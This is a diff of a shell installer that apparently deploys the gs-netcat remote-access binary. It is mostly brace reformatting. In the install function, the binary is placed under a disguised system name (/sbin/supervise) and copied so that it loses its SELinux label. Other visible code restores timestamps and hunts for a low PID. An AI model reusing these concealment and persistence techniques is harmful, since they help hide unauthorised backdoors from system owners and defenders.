@@ -442,8 +442,7 @@ xrmdir()
 	rmdir "${fn:?}" 2>/dev/null
 }
 
-xrm()
-{
+xrm() {
 	local pdir
 	local fn
 	fn="$1"
@@ -456,8 +455,7 @@ xrm()
 
 # Create a directory if it does not exist and fix timestamp
 # xmkdir [directory] <ts reference file>
-xmkdir()
-{
+xmkdir() {
 	local fn
 	local pdir
 	fn="$1"
@@ -486,12 +484,12 @@ xmkdir()
 	true
 }
 
-xcp()
-{
+xcp() {
 	local src="$1"
 	local dst="$2"
 
 	# DEBUGF "${CG}XCP($src, $dst)${CN}"
+	# Must create file first so that SELinux does not inherit the user_tmp_t flag
 	mk_file "$dst" || return
 	cp "$src" "$dst" || return
 	return 0
@@ -509,8 +507,7 @@ xmv() {
 	return 0
 }
 
-clean_all()
-{
+clean_all() {
 	[[ "${#_GS_TMPDIR}" -gt 5 ]] && {
 		rm -rf "${_GS_TMPDIR:?}/"*
 		rmdir "${_GS_TMPDIR}"
@@ -519,15 +516,13 @@ clean_all()
 	ts_restore
 }
 
-exit_code()
-{
+exit_code() {
 	clean_all
 
 	exit "$1"
 }
 
-errexit()
-{
+errexit() {
 	[[ -z "$1" ]] || echo -e >&2 "${CR}$*${CN}"
 
 	exit_code 255
@@ -1901,8 +1896,15 @@ install()
 	OK_OUT
 
 	echo -en "Copying binaries......................................................"
-	xmv "${_GS_TMPDIR}/gs-netcat" "${DSTBIN:?}" || { FAIL_OUT; errexit; }
-	chmod 700 "$DSTBIN"
+	# SELinux bug (?): can not use 'xmv' because the destination file inherits the
+	# user_tmp_t flag from the source file (ls -Zl /sbin/supervise):
+	# -rwx------. 1 root root unconfined_u:object_r:user_tmp_t:s0 2328932 Jul  9 13:41 /sbin/supervise
+	# 'xcp' solves this elegantly by first creating a destination file with 'touch' (without
+	# the user_tmp_t flag) and the copying the source to the destination - which (shock)
+	# removes the user_tmp_t flag (!).
+	xcp "${_GS_TMPDIR}/gs-netcat" "${DSTBIN:?}" || { FAIL_OUT; errexit; }
+	rm -f "${_GS_TMPDIR}/gs-netcat"
+	chmod 711 "$DSTBIN"
 	OK_OUT
 
 	echo -en "Testing binaries......................................................"
@@ -2064,7 +2066,7 @@ fi
 [[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
 
 [[ -n "$GS_FFPID" ]] && {
-	echo -en "Using low PID. May take 40 sec. Set GS_NOFFPID=1 to disable..........."
+	echo -en "Using low PID. May take 60 sec. Set GS_NOFFPID=1 to disable..........."
 	if res=$(GS_UTIL_FFPID=1 GS_CONFIG_READ=0 "${DSTBIN:-$INFECTED_BIN_NAME}" 2>/dev/null); then
 		OK_OUT "Low PID found at ~${res:-NA}"
 	else
